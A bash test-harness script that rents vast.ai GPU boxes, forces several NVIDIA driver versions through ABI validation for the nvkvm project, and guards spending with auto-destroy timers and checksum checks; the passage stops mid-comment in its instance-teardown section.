#!/usr/bin/env bash
#
# scripts/sweep.sh -- unattended nvkvm coverage sweep: one box per GPU
#                     ARCHITECTURE, each forced through >=5 NVIDIA driver
#                     versions chosen to cross the ABI profile boundaries.
#
# ONE SENTENCE: rent a vast.ai KVM box, build nvkvm on it, boot the guest, run
# tests/validate.sh against N *forced* host driver versions, destroy the box,
# move to the next architecture -- with no human and no agent per box.
#
# ---------------------------------------------------------------------------
# WHY THIS EXISTS
# ---------------------------------------------------------------------------
# Coverage used to cost one operator (or one agent) per box.  That does not
# scale, and worse, it makes the QUALITY of a result depend on how careful
# whoever was watching happened to be.  The specific failure this script is
# built to make impossible is A DRIVER THAT WAS NEVER ACTUALLY TESTED being
# banked as a pass.  So:
#
#   * a driver that could not be installed FAILS the box.  It is never skipped
#     quietly, never rendered as a blank cell, and always changes the exit code.
#   * "the box never provisioned", "the driver could not be installed", "the
#     guest never booted" and "validate.sh failed" are four different statuses
#     with four different meanings, and the summary keeps them apart.
#   * every result carries the driver version /proc/driver/nvidia/version
#     actually reported -- not the one we asked for, and never the one vast.ai
#     advertised.
#
# ---------------------------------------------------------------------------
# WHAT COVERAGE MEANS HERE
# ---------------------------------------------------------------------------
# The unit of coverage is the ARCHITECTURE, not the GPU model.  Sweeping three
# Ada cards buys nothing; sweeping one Ada card and moving to Hopper buys a row.
# The target is one box per major architecture -- turing, ampere, ada, hopper,
# blackwell -- each forced through at least --min-drivers (default 5) versions.
#
# The five-plus versions are not "five recent drivers".  They are chosen to
# CROSS THE ABI PROFILE BOUNDARIES, because the profile table is the thing a new
# driver version actually breaks.  See DRIVER_PRESET_BOUNDARY below for the list
# and the reason each row is in it.
#
# ---------------------------------------------------------------------------
# LAYERS (build order, and the order to debug in)
# ---------------------------------------------------------------------------
#   L1  one box, one driver     --arch ampere --drivers 580.95.05 --go
#   L2  one box, N drivers      --arch ampere --go
#   L3  every architecture      --all-arches --go
#   S   the SteamOS product     --arch ada --drivers 580.95.05 --steamos --go
#
# L1-L3 answer "does the ABI hold". They install no product and open no window.
# The S stage answers a different and, before a release, more important
# question: does a user who follows the README end up at a desktop. It runs once
# per box after the driver loop and reports its own six verdicts.
#
# BOXES ARE DESTROYED ON SUCCESS AND KEPT ON FAILURE -- a failing box is the
# only copy of the state that produced the failure, and the auto-destroy timer
# bounds what that costs. --destroy-on-error restores unconditional teardown.
#
# ---------------------------------------------------------------------------
# RELATIONSHIP TO scripts/sweep_matrix.py
# ---------------------------------------------------------------------------
# sweep_matrix.py did the per-box work first, and its comments carry lessons
# that cost real money to learn: the gcc-11/gcc-12 kernel-module trap, the
# held-dpkg driver purge, NVIDIA's CDN 403s, the stale host-libs bundle.  This
# script does NOT fork that knowledge -- it CALLS it.  install_driver() below
# invokes sweep_matrix.install_driver() directly, so there is exactly one
# implementation of the hard part.
#
# Expected ABI profiles are likewise not restated here: they are computed by
# compiling src/common/nvkvm_abi.h and asking nvkvm_abi_id_for_version(), which
# is the code under test's own answer rather than a copy of it that can drift.
#
# What sweep.sh adds is everything AROUND the box, which is where the
# unattended failures actually live: money safety that survives this process
# being killed, telling a slow box apart from a dead one, a growing known-bad
# machine list, resumability, and an exit code that means something.
#
# ---------------------------------------------------------------------------
# USAGE
# ---------------------------------------------------------------------------
#   scripts/sweep.sh                          # dry run: plan + real offer
#                                             # lookup + cost estimate. $0.
#   scripts/sweep.sh --arch ampere --drivers 580.95.05 --go     # L1
#   scripts/sweep.sh --arch ada --driver-cache /srv/nvidia --go  # relay CDN-blocked installers
#   scripts/sweep.sh --arch ada --guest-image-cache /srv/images/noble-server-cloudimg-amd64.img --go
#   scripts/sweep.sh --arch ampere --go                          # L2
#   scripts/sweep.sh --all-arches --go --max-spend 12            # L3
#   scripts/sweep.sh --resume sweep-runs/2026-08-23T10-00-00Z --go
#   scripts/sweep.sh --reconcile              # destroy strays, spend $0
#
# Stop a running sweep gracefully:   touch /tmp/nvkvm-sweep.stop
# (checked between drivers and between boxes; unwinds through the normal
# destroy paths.  Do NOT kill -9 the sweep -- that is what the standalone
# auto-destroy timer exists to survive, but it is the net, not the plan.)
#
# EXIT CODES
#   0  every applicable driver on every requested architecture was tested and
#      validate.sh passed for all of them
#   1  at least one validate.sh FAILed or came back INCOMPLETE (a real result)
#   2  at least one applicable driver could NOT be tested -- coverage is
#      incomplete and this run must not be read as a clean sweep
#   3  the sweep could not start (no vastai, no api key, dirty tree, the
#      auto-destroy timer would not arm)
#   4  an instance may have LEAKED and is possibly still billing.  Read the
#      shouting at the end and destroy it by hand.
#
set -u -o pipefail
# NOT `set -e`.  A box failing must be recorded and moved past, not abort the
# run with the next box unrented and -- far worse -- the current one undestroyed.

REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SELF="$(basename "${BASH_SOURCE[0]}")"

# ---------------------------------------------------------------------------
# defaults
# ---------------------------------------------------------------------------
KVM_IMAGE="${NVKVM_SWEEP_IMAGE:-docker.io/vastai/kvm:ubuntu_cli_22.04-2025-05-16}"
# WHY THIS IMAGE AND NOT ANY OTHER.  `vms_enabled=true` on an offer describes
# what the MACHINE can do, not what you get.  Rent without vast's KVM image and
# you get an ordinary Docker container on a VM-capable host: no /dev/kvm, the
# NVIDIA module belongs to the physical host, and every driver install below is
# a silent no-op that re-measures the same driver N times.  The desktop variant
# (docker.io/vastai/kvm:ubuntu_desktop_22.04-2025-11-21) is the one to use for
# anything interactive; this sweep is headless, so the cli image is correct and
# faster to pull.
# The vast label every instance this run creates carries.
#
# reap_strays() destroys BY LABEL, so two runs sharing one label reap each
# other's boxes mid-build.  That used to be documented here as an instruction to
# the operator -- "give each concurrent run its own label" -- and OBSERVED
# 2026-08-29: two runs each had their own --out, both kept a correct per-run
# registry, and the first to finish destroyed the second's box anyway, calling
# it a STRAY. A rule that only holds when someone remembers it is not a rule.
#
# So the label is now UNIQUE PER RUN by default, derived below from the run
# directory (which is already required to be unique). NVKVM_SWEEP_LABEL still
# overrides it for anyone who wants two runs to share a reaper on purpose.
SWEEP_LABEL_PREFIX="nvkvm-sweep"
SWEEP_LABEL="${NVKVM_SWEEP_LABEL:-}"
STOP_FILE="/tmp/nvkvm-sweep.stop"
# Assigned for real once OUT_DIR exists; empty here so the --reconcile path,
# which runs reap_strays() before that point, cannot trip `set -u`.
KEPT_FILE=""
KNOWN_BAD_FILE="$REPO/scripts/sweep-known-bad-machines.txt"

ARCHES=""
ALL_ARCHES=0
# --ssh: run against a box we did not rent.  Unlocks the axes vast cannot reach
# (datacenter silicon, an old-kernel host for the 515/525 profiles, your own
# hardware) and lets a THIRD PARTY run this identical harness and send back a
# row -- which is the only way the evidence stops being self-recorded.
MANUAL_SSH=""
# Driver install is PURGE-AND-REPLACE.  That is correct on a box we rented and
# will destroy; it is destructive on a machine somebody cares about.  So for a
# manual host it is OFF unless asked for, and the run measures whatever driver
# is already installed.  Never make "I pointed it at my workstation" cost
# somebody their driver stack.
ALLOW_DRIVER_INSTALL=0
GPU_FILTER=""
DRIVERS_REQ=""
DRIVER_CACHE_DIR="${NVKVM_SWEEP_DRIVER_CACHE:-}"
BOOT_KERNEL="${NVKVM_SWEEP_BOOT_KERNEL:-}"
GUEST_IMAGE_CACHE="${NVKVM_SWEEP_GUEST_IMAGE_CACHE:-}"
GUEST_IMAGE_CACHE_SHA256=""
# RULE 4: the GUEST kernel is a swept axis, not a constant.
#
# nvkvm-guest.ko is compiled against whatever kernel the guest runs, on every
# boot, and until now every box ran the same noble image -- so one kernel was
# ever tested. The cheapest real lever is the cloud image series: each Ubuntu
# release ships a different kernel, and swapping the series costs nothing but a
# different URL. --guest-image picks one.
#
# VERIFIED 2026-08-30 that each of these resolves; oracular and plucky 404.
GUEST_IMAGE_SERIES="${NVKVM_SWEEP_GUEST_SERIES:-noble}"
GUEST_IMAGE_NAME="$GUEST_IMAGE_SERIES-server-cloudimg-amd64.img"
GUEST_IMAGE_URL="https://cloud-images.ubuntu.com/$GUEST_IMAGE_SERIES/current/$GUEST_IMAGE_NAME"
PRESET="boundary"
MIN_DRIVERS=5
# The SteamOS product stage: off by default because it costs ~2h of box time and
# many GB of transfer per box, and it is orthogonal to driver-ABI coverage.
RUN_STEAMOS=0
STEAMOS_REF="${NVKVM_SWEEP_STEAMOS_REF:-main}"
# Keep a failing box alive so the failure can be inspected.  The auto-destroy
# timer bounds it; --destroy-on-error restores unconditional teardown.
DESTROY_ON_ERROR=0
MAX_DPH=0.50
# COST HAS THREE COMPONENTS AND dph_total ONLY CARRIES TWO.
#
# MEASURED against the offer API: dph_total == dph_base + storage_total_cost.
# NETWORK IS NOT IN IT, and this harness is network-heavy by construction --
# one NVIDIA .run per driver, 300-450 MB each.
#
# MEASURED DISTRIBUTION over 95 vms_enabled offers (2026-08-29):
#
#   network in   $/TB       median  4.00   p75 12.00   p90 26.67   max 40.00
#   network out  $/TB       median  4.00   p75 12.67   p90 30.67   max 40.00
#   storage      $/GB/month median  0.200  p75 0.200   p90 0.333   max 0.667
#   gpu base     $/hr       median  0.33   p75 0.72    p90 1.09    max 5.60
#
# Two things follow, and both corrected an earlier guess here.
#
# The market CEILING for network is $40/TB -- p95, p98 and max are all 40.00 --
# so the $60 cap this file first shipped rejected nothing at all. And for a
# 3-hour box with a 150 GB disk moving ~8 GB, STORAGE COSTS MORE THAN NETWORK:
# $0.12-0.41 against $0.03-0.31. Both are noise beside compute ($0.21-3.27 for
# the same box), so neither belongs in the selection as a hard preference.
#
# Hence: the caps below are OUTLIER GUARDS set from the observed maxima, not
# tuning knobs. They reject a host that is off the market or that declines to
# state a price; they do not shave pennies, because shaving pennies here costs
# coverage -- and on a rare architecture, excluding the top decile of hosts can
# mean no offer at all. Preference is expressed in the RANKING instead, which
# scores every candidate on what this job will actually cost it.
MAX_STORAGE_PER_GB_MONTH=0.70   # observed max 0.667
MAX_INET_DOWN_PER_TB=40         # observed max 40.00 -- the market ceiling
MAX_INET_UP_PER_TB=40           # observed max 40.00
EST_DOWN_GB_PER_BOX=8           # repo + guest image + one .run per driver + apt
MAX_SPEND=10.00
BUDGET_HOURS=8
DISK=64
OUT_DIR=""
RESUME_DIR=""
GO=0
KEEP=0
RECONCILE=0
ALLOW_DIRTY=0
CONTROL=1
BOX_ATTEMPTS=3
# Provisioning patience.  45 minutes, and that is not padding: a vast KVM box
# routinely spends ~30 MINUTES in `loading` while the image pulls.  Three
# healthy instances were destroyed mid-pull on 2026-08-23 and paid for twice.
# Waiting costs cents; a wrong destroy costs a re-rent AND another 30 minutes.
WAIT_BUDGET=2700
# Poll cadence and the settle window for the dead-box check.  Overridable ONLY
# so tests/sweep_offline_test.sh can drive the real code paths in seconds
# instead of minutes; the defaults are what a real run uses.
POLL_INTERVAL="${NVKVM_SWEEP_POLL:-20}"
DEADCHECK_SETTLE="${NVKVM_SWEEP_DEADCHECK_SETTLE:-120}"
# Backoff between destroy attempts.  Real values give vast.ai time to actually
# tear the instance down before we re-check the listing; the offline test sets
# them to 0 so it can assert the retry COUNT without waiting 90 seconds for it.
DESTROY_SETTLE="${NVKVM_SWEEP_DESTROY_SETTLE:-8}"
DESTROY_BACKOFF="${NVKVM_SWEEP_DESTROY_BACKOFF:-10}"

# Instances that must never be destroyed no matter what, as a second lock
# behind "only ever destroy what is in our own registry or carries our label".
PROTECTED_DEFAULT="48097794 48210901 48251528 48468578 48499853 48499877"
PROTECTED="${NVKVM_SWEEP_PROTECT:-$PROTECTED_DEFAULT}"

# ---------------------------------------------------------------------------
# THE DRIVER SET
#
# Five-plus versions chosen to CROSS ABI PROFILE BOUNDARIES, not five recent
# ones.  nvkvm's correctness against a driver is decided by exactly one thing:
# does the ABI profile it selects describe that driver's real struct layouts?
# So the set walks the profile seams.
#
# Columns:  version <TAB> alternates <TAB> why this row exists
# The expected profile is NOT written here -- it is computed from
# src/common/nvkvm_abi.h at run time (see abi_expected).  Alternates are
# same-profile stand-ins for a version NVIDIA has stopped publishing; every
# alternate is VERIFIED to select the same profile as its primary before it is
# allowed to substitute, so a substitution can never quietly change what the row
# measures.
#
# ROWS THAT MUST NOT BE ADDED, and why:
#   610.88   DOES NOT EXIST for Linux.  NVIDIA's index lists only 610.43.02,
#            610.43.03 and 610.57.04 for the 6xx branch.
#   596-609  EMPTY.  No OGKM branch was ever published in that range -- see the
#            comment in nvkvm_abi_id_for_version() saying exactly that.  There
#            is no driver there to test.
# Adding either produces an install failure that reads like a driver finding
# and is nothing of the kind.
# ---------------------------------------------------------------------------
# VERIFIED DOWNLOADABLE 2026-08-23: every primary below, and every alternate,
# returned HTTP 200 from one of the two paths in driver_urls().  Re-check with
# a ranged HEAD before blaming a box when an install starts 404ing -- NVIDIA
# unpublishes versions, which is why DRIVER_ALTS exists at all.
DRIVER_PRESET_BOUNDARY="\
565.57.01	565.77	below the 570 seam: the top of the 550 profile range
570.124.06	570.133.07,570.86.15	the 570 profile proper (== 575 layouts)
580.95.05	580.65.06,580.105.08	BOTTOM of the 580 profile's claimed 580..595 range
590.48.01	590.44.01	MIDDLE of that range -- measured byte-identical to 580, so a disagreement here is real
595.84	595.91.07,595.44.02	TOP of the range: the seam where the struct table and the NVKMS enum table disagree about eras
610.57.04	610.43.03,610.43.02	the newest published 610; V610 channel (376 B, +hHandleVASpace)"
#
# Note the architecture floor does the right thing automatically: Blackwell's
# floor is 570, so 565.57.01 drops out and Blackwell still gets 5 rows, while
# every older architecture gets 6.  That is why there are six rows and not five.

# ---------------------------------------------------------------------------
# argument parsing
# ---------------------------------------------------------------------------
usage() { sed -n '2,95p' "$0" | sed 's/^# \{0,1\}//'; exit 0; }

while [ $# -gt 0 ]; do
    case "$1" in
        --arch)         ARCHES="$2"; shift 2 ;;
        --ssh)          MANUAL_SSH="$2"; shift 2 ;;
        --allow-driver-install) ALLOW_DRIVER_INSTALL=1; shift ;;
        --all-arches)   ALL_ARCHES=1; shift ;;
        --gpu)          GPU_FILTER="$2"; shift 2 ;;
        --drivers)      DRIVERS_REQ="$2"; shift 2 ;;
        --driver-cache) DRIVER_CACHE_DIR="$2"; shift 2 ;;
        --boot-kernel)  BOOT_KERNEL="$2"; shift 2 ;;
        --guest-image-cache) GUEST_IMAGE_CACHE="$2"; shift 2 ;;
        --guest-image)  GUEST_IMAGE_SERIES="$2"
                        case "$GUEST_IMAGE_SERIES" in
                            jammy|noble|questing|resolute) ;;
                            *) echo "$SELF: --guest-image wants jammy|noble|questing|resolute (each verified to resolve); got '$GUEST_IMAGE_SERIES'" >&2; exit 3 ;;
                        esac
                        GUEST_IMAGE_NAME="$GUEST_IMAGE_SERIES-server-cloudimg-amd64.img"
                        GUEST_IMAGE_URL="https://cloud-images.ubuntu.com/$GUEST_IMAGE_SERIES/current/$GUEST_IMAGE_NAME"
                        shift 2 ;;
        --preset)       PRESET="$2"; shift 2 ;;
        --min-drivers)  MIN_DRIVERS="$2"; shift 2 ;;
        --steamos)      RUN_STEAMOS=1; shift ;;
        --steamos-ref)  STEAMOS_REF="$2"; shift 2 ;;
        --destroy-on-error) DESTROY_ON_ERROR=1; shift ;;
        --max-dph)      MAX_DPH="$2"; shift 2 ;;
        --max-storage-gb-month) MAX_STORAGE_PER_GB_MONTH="$2"; shift 2 ;;
        --max-inet-down-tb)   MAX_INET_DOWN_PER_TB="$2"; shift 2 ;;
        --max-inet-up-tb)     MAX_INET_UP_PER_TB="$2"; shift 2 ;;
        --max-spend)    MAX_SPEND="$2"; shift 2 ;;
        --budget-hours) BUDGET_HOURS="$2"; shift 2 ;;
        --disk)         DISK="$2"; shift 2 ;;
        --out)          OUT_DIR="$2"; shift 2 ;;
        --resume)       RESUME_DIR="$2"; shift 2 ;;
        --image)        KVM_IMAGE="$2"; shift 2 ;;
        --wait-budget)  WAIT_BUDGET="$2"; shift 2 ;;
        --box-attempts) BOX_ATTEMPTS="$2"; shift 2 ;;
        --no-control)   CONTROL=0; shift ;;
        --go)           GO=1; shift ;;
        --dry-run)      GO=0; shift ;;
        --keep)         KEEP=1; shift ;;
        --reconcile)    RECONCILE=1; shift ;;
        --allow-dirty)  ALLOW_DIRTY=1; shift ;;
        -h|--help)      usage ;;
        *) echo "$SELF: unknown option '$1' (try --help)" >&2; exit 3 ;;
    esac
done

# The SteamOS stage changes the shape of a box: a 3.2 GB recovery image that
# decompresses to ~10 GB, a qcow2 with two 8 GiB rootfs slots, a locally built
# QEMU image, and a multi-GB OTA on top.  64 GB is comfortable for the driver
# loop and NOT enough for that -- and a box that runs out mid-install produces
# exactly the SIGBUS-truncated NVIDIA tree this stage exists to catch, which
# would then be read as a product bug rather than a harness one.
if [ "$RUN_STEAMOS" = 1 ]; then
    [ "$DISK" -ge 128 ] 2>/dev/null || DISK=128
    EST_DOWN_GB_PER_BOX=$(( EST_DOWN_GB_PER_BOX + 14 ))
fi

# ---------------------------------------------------------------------------
# small utilities
# ---------------------------------------------------------------------------
say()  { printf '%s\n' "$*"; }
info() { printf '[%s] %s\n' "$(date -u +%H:%M:%S)" "$*"; }
warn() { printf '[%s] !! %s\n' "$(date -u +%H:%M:%S)" "$*" >&2; }
die()  { printf '\n%s: FATAL: %s\n' "$SELF" "$*" >&2; exit "${2:-3}"; }

valid_sha256() { [[ "${1:-}" =~ ^[[:xdigit:]]{64}$ ]]; }

# Resolve and authenticate the optional coordinator-local cloud image before
# any offer can be rented.  The image itself is opaque here: the coordinator
# only hashes and copies it, and never asks qemu-img (or anything else) to
# parse/execute its contents.
#
# Trust can come from FILE.sha256 (a bare digest, sha256sum-style filename, or
# setup_guest.sh's digest-plus-source-URL format) or from Ubuntu's SHA256SUMS
# beside FILE.  If a sidecar exists it is authoritative: a stale/malformed one
# is an error, not a reason to silently fall through to some other digest.
validate_guest_image_cache() {
    local src="$GUEST_IMAGE_CACHE" sidecar manifest hash binding extra actual dir base
    GUEST_IMAGE_CACHE_SHA256=""
    [ -n "$src" ] || return 0
    [ -f "$src" ] && [ -r "$src" ] && [ -s "$src" ] \
        || { warn "guest image cache is not a readable non-empty file: $src"; return 1; }

    dir="$(cd -- "$(dirname -- "$src")" && pwd -P)" \
        || { warn "cannot resolve guest image cache: $src"; return 1; }
    base="$(basename -- "$src")"
    src="$dir/$base"
    sidecar="$src.sha256"
    manifest="$dir/SHA256SUMS"
    hash=""

    if [ -f "$sidecar" ]; then
        binding=""; extra=""
        read -r hash binding extra <"$sidecar" || true
        if ! valid_sha256 "$hash" || [ -n "$extra" ]; then
            warn "guest image cache checksum sidecar is malformed: $sidecar"
            return 1
        fi
        if [ -n "$binding" ]; then
            binding="${binding#\*}"
            case "$binding" in
                "$src"|"$base"|"$GUEST_IMAGE_NAME"|"$GUEST_IMAGE_URL") ;;
                *) warn "guest image cache checksum is bound to '$binding', not $src"; return 1 ;;
            esac
        fi
    elif [ -f "$manifest" ]; then
        hash="$(awk -v wanted="$GUEST_IMAGE_NAME" '
            {
                name = $2
                sub(/^\*/, "", name)
                if (name == wanted && length($1) == 64 && $1 !~ /[^[:xdigit:]]/) {
                    print tolower($1)
                    exit
                }
            }
        ' "$manifest")"
        if ! valid_sha256 "$hash"; then
            warn "no valid SHA-256 for $GUEST_IMAGE_NAME in $manifest"
            return 1
        fi
    else
        warn "guest image cache needs $sidecar or Ubuntu SHA256SUMS beside it"
        return 1
    fi

    actual="$(sha256sum -- "$src" 2>/dev/null | awk '{print $1}')"
    if ! valid_sha256 "$actual" || [ "${actual,,}" != "${hash,,}" ]; then
        warn "guest image cache SHA-256 mismatch: $src"
        return 1
    fi
    GUEST_IMAGE_CACHE="$src"
    GUEST_IMAGE_CACHE_SHA256="${actual,,}"
    return 0
}

stop_requested() { [ -f "$STOP_FILE" ]; }

# vastai with machine-readable output.  ALWAYS 2>/dev/null: the CLI prints a
# DEPRECATION banner on stderr, and merging it into stdout puts prose in front
# of the JSON, which json.load then rejects outright.
vj() { timeout 180 vastai "$@" --raw 2>/dev/null; }

# Build one JSON object from key/value pairs.  A key suffixed with ':json'
# embeds its value as raw JSON rather than a string, so validate.sh's own JSON
# nests and stays queryable instead of being escaped into an opaque blob.
jrec() {
python3 -c '
import json, sys
a = sys.argv[1:]
o = {}
for i in range(0, len(a) - 1, 2):
    k, v = a[i], a[i + 1]
    if k.endswith(":json"):
        try:
            o[k[:-5]] = json.loads(v)
        except Exception:
            o[k[:-5]] = None
            o[k[:-5] + "_unparsed"] = v[:2000]
    else:
        o[k] = v
print(json.dumps(o))
' "$@"
}

# ---------------------------------------------------------------------------
# expected ABI profile -- asked of the code under test, not copied from it
#
# A hand-maintained expectation table is a copy, and copies drift.  Compiling
# src/common/nvkvm_abi.h and calling nvkvm_abi_id_for_version() means the
# expectation is BY CONSTRUCTION whatever the shipped selector says, so the
# comparison in the results is "did the running QEMU agree with the header it
# was built from", which is the question worth asking.
# ---------------------------------------------------------------------------
ABIQ=""
ABIQ_DIR=""
build_abiq() {
    local src="$REPO/src/common/nvkvm_abi.h"
    [ -f "$src" ] || { warn "no $src -- expected ABI profiles will read '?'"; return 1; }
    command -v cc >/dev/null || { warn "no cc -- expected ABI profiles will read '?'"; return 1; }
    # `mktemp -u` RESERVES NOTHING -- it prints a name and returns, which
    # mktemp's own man page calls unsafe.  Both writes below then landed in the
    # world-writable /tmp through an unreserved name: `cat > "$ABIQ.c"` and
    # `cc -o "$ABIQ"` are plain O_CREAT|O_TRUNC, so a local user who plants a
    # symlink at either name between the mktemp and the write has the sweep
    # truncate and overwrite a file of their choosing, as whoever runs the
    # sweep -- root, on the machine that holds the vast.ai API key.  A
    # directory created with mode 0700 by mktemp -d fixes both names at once,
    # which is why the binary and its source move inside one rather than
    # getting an mktemp each.
    ABIQ_DIR="$(mktemp -d /tmp/nvkvm-abiq.XXXXXX)" || { warn "mktemp -d failed -- expected ABI profiles will read '?'"; return 1; }
    ABIQ="$ABIQ_DIR/abiq"
    cat >"$ABIQ.c" <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include "common/nvkvm_abi.h"
int main(int argc, char **argv)
{
    unsigned a = 0, b = ~0u, c = ~0u;
    if (argc > 1) {
        char *p = argv[1];
        a = strtoul(p, &p, 10);
        if (*p == '.') { p++; b = strtoul(p, &p, 10); }
        if (*p == '.') { p++; c = strtoul(p, &p, 10); }
    }
    printf("%u\n", nvkvm_abi_id_for_version(a, b, c));
    return 0;
}
EOF
    cc -I "$REPO/src" -o "$ABIQ" "$ABIQ.c" 2>/dev/null || { ABIQ=""; return 1; }
    # Leaving the ABI helper behind on every run is how /tmp fills up on a
    # coordinator that sweeps nightly; cleanup() already runs on EXIT and INT.
    return 0
}
abi_expected() {   # abi_expected 580.95.05 -> 580  (or '?')
    [ -n "$ABIQ" ] && [ -x "$ABIQ" ] || { echo "?"; return; }
    "$ABIQ" "$1" 2>/dev/null || echo "?"
}

# ---------------------------------------------------------------------------
# the architecture map and floors -- READ FROM sweep_matrix.py, not restated
# ---------------------------------------------------------------------------
MATRIX_TSV=""
load_matrix() {
    MATRIX_TSV="$(python3 - "$REPO" <<'PY'
import sys, os, importlib.util
repo = sys.argv[1]
spec = importlib.util.spec_from_file_location(
    "sweep_matrix", os.path.join(repo, "scripts", "sweep_matrix.py"))
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)          # guarded by __main__, so nothing runs
for ver, prof, why in m.DRIVER_MATRIX:
    print("\t".join(["DRV", ver, ",".join(m.DRIVER_ALTS.get(ver, [])), why]))
for arch, floor in m.ARCH_FLOOR.items():
    print("\t".join(["FLOOR", arch, str(floor)]))
for arch in m.OPEN_MODULE_ARCHES:
    print("\t".join(["OPENMOD", arch]))
PY
)" || return 1
    [ -n "$MATRIX_TSV" ]
}

arch_floor() { printf '%s\n' "$MATRIX_TSV" | awk -F'\t' -v a="$1" '$1=="FLOOR"&&$2==a{print $3}'; }

# Blackwell and the datacenter Hopper parts need the OPEN kernel module
# (-m=kernel-open); the proprietary one either refuses to build or refuses to
# bind.  sweep_matrix.install_driver() applies this from the arch we pass it.
arch_needs_open_module() {
    printf '%s\n' "$MATRIX_TSV" | awk -F'\t' -v a="$1" '$1=="OPENMOD"&&$2==a{f=1} END{exit !f}'
}

# The driver rows applicable to an architecture.
#
# A driver older than the silicon installs fine and then reports no devices.
# That is NOT an nvkvm result and must never be scored as one -- but it is also
# not a testable unit, so the floor excludes it here rather than letting it
# become a failure later.
#
# Output: version <TAB> alternates <TAB> expected-profile <TAB> why
drivers_for_arch() {
    local arch="$1" floor rows ver alts why maj
    floor="$(arch_floor "$arch")"; floor="${floor:-0}"

    case "$PRESET" in
        boundary) rows="$DRIVER_PRESET_BOUNDARY" ;;
        matrix)   rows="$(printf '%s\n' "$MATRIX_TSV" | awk -F'\t' '$1=="DRV"{print $2"\t"$3"\t"$4}')" ;;
        *)        die "unknown --preset '$PRESET' (want: boundary, matrix)" 3 ;;
    esac

    # '|' and not $'\t': tab is IFS *whitespace*, so bash collapses runs of it
    # and an EMPTY alternates column vanishes, shifting `why` into `alts` and
    # leaving the caller comparing an ABI profile against a sentence.  Every
    # DRIVER_PRESET_BOUNDARY row has alternates, which is why this never showed
    # up offline; --drivers rows and the matrix rows for versions with no
    # substitute (575.51.03) do not.
    while IFS='|' read -r ver alts why; do
        [ -z "$ver" ] && continue
        maj="${ver%%.*}"
        [ "$maj" -lt "$floor" ] 2>/dev/null && continue
        if [ -n "$DRIVERS_REQ" ]; then
            case ",$DRIVERS_REQ," in *",$ver,"*) ;; *) continue ;; esac
        fi
        printf '%s|%s|%s|%s\n' "$ver" "$alts" "$(abi_expected "$ver")" "$why"
    done <<<"$(printf '%s\n' "$rows" | tr '\t' '|')"

    # An explicitly requested version that is in no preset is still honoured --
    # otherwise --drivers would silently do nothing, which is the class of
    # quiet no-op this whole script exists to eliminate.
    if [ -n "$DRIVERS_REQ" ]; then
        local d
        for d in ${DRIVERS_REQ//,/ }; do
            printf '%s\n' "$rows" | cut -f1 | grep -qx "$d" && continue
            maj="${d%%.*}"
            [ "$maj" -lt "$floor" ] 2>/dev/null && continue
            printf '%s|%s|%s|%s\n' "$d" "" "$(abi_expected "$d")" "explicitly requested with --drivers"
        done
    fi
}

# ---------------------------------------------------------------------------
# known-bad machines
#
# A vast machine can fail to provision KVM DETERMINISTICALLY, forever, in a way
# that has nothing to do with the guest stack: the instance sits at
# actual_status=created, sshd never listens, and the instance log freezes at
#     libvirt: QEMU Driver error : Domain not found: no domain with matching
#     name 'C.<id>'
# `reboot instance` and `recycle instance` reproduce a byte-identical frozen
# log, so retrying the same machine is pure waste.  The list is committed so the
# knowledge outlives the run that learned it, and grows automatically below.
# ---------------------------------------------------------------------------
known_bad() {
    [ -f "$KNOWN_BAD_FILE" ] || return 1
    grep -oE '^[0-9]+' "$KNOWN_BAD_FILE" 2>/dev/null | grep -qx "$1"
}
blacklist_machine() {
    known_bad "$1" && return 0
    printf '%s\t# %s (added automatically by %s on %s)\n' \
        "$1" "$2" "$SELF" "$(date -u +%Y-%m-%d)" >>"$KNOWN_BAD_FILE"
    warn "machine $1 added to the known-bad list: $2"
}

# ---------------------------------------------------------------------------
# money safety
# ---------------------------------------------------------------------------
REGISTRY=""
TIMER_PID=""
SPENT="0"
LEAK_SUSPECTED=0

register_instance() { printf '%s\n' "$1" >>"$REGISTRY"; sync 2>/dev/null || true; }

# Arm the standalone auto-destroy timer, then PROVE it is running with ps.
#
# "I started it" is not evidence.  A failed exec, a missing interpreter and a
# syntax error all look identical to a successful background launch from the
# caller's point of view, and the difference only becomes visible as a bill.
arm_autodestroy() {
    local deadline script log pid args
    script="$REPO/scripts/sweep_autodestroy.sh"
    [ -f "$script" ] || die "auto-destroy script missing: $script"
    [ -x "$script" ] || chmod +x "$script" 2>/dev/null

    deadline=$(( $(date +%s) + $(python3 -c "print(int(float('$BUDGET_HOURS')*3600))") ))
    log="$OUT_DIR/autodestroy.log"

    # setsid + nohup: the timer must outlive this shell, its process group and
    # its controlling terminal.  If the sweep is killed -- including kill -9,
    # which no trap can catch -- the net stays up.
    NVKVM_SWEEP_PROTECT="$PROTECTED" \
        setsid nohup bash "$script" "$deadline" "$REGISTRY" "$log" >/dev/null 2>&1 &
    pid=$!
    sleep 2

    # ps(1) is the verification the standing rule asks for.  Match the EXACT
    # pid and read its argv back.  Never `pkill -f`/`pgrep -f` on a pattern that
    # could match this script's own command line -- that has killed the issuing
    # shell in five separate sessions on this project.
    args="$(ps -p "$pid" -o args= 2>/dev/null || true)"
    case "$args" in
        *sweep_autodestroy.sh*)
            TIMER_PID="$pid"
            info "auto-destroy armed: pid=$pid deadline=+${BUDGET_HOURS}h log=$log"
            info "  ps confirms: $args"
            ;;
        *)
            die "auto-destroy timer did NOT come up (pid=$pid, ps='$args').
Refusing to rent anything without a working net." 3
            ;;
    esac
}

# The number that decides whether we may rent again.  Checked BEFORE every
# create -- a cap that is only reported at the end is not a cap.
spend_add()  { SPENT="$(python3 -c "print(round($SPENT + $1, 4))")"; }
spend_room() { python3 -c "import sys; sys.exit(0 if $SPENT + $1 <= $MAX_SPEND else 1)"; }

# ---------------------------------------------------------------------------
# destroying things, and proving they are gone
# ---------------------------------------------------------------------------
is_protected() { case " $PROTECTED " in *" $1 "*) return 0 ;; *) return 1 ;; esac; }

live_instance_ids() {
    vj show instances | python3 -c '
import json,sys
try: d = json.load(sys.stdin)
except Exception: sys.exit(0)
if isinstance(d, dict): d = d.get("instances", []) or []
for i in d: print(i.get("id"))
' 2>/dev/null
}

# Destroy and CONFIRM.  Two independent traps, each of which silently leaves a
# box billing:
#   1. `vastai destroy instance` prompts "[y/N]".  With no tty it reads EOF,
#      prints "Aborted." and exits 0 -- a no-op that looks like a success.
#      So: `yes |` AND `-y`.
#   2. Even then the exit status only says the CLI ran.  A create can print
#      "success": false and still leave a live contract, so return values here
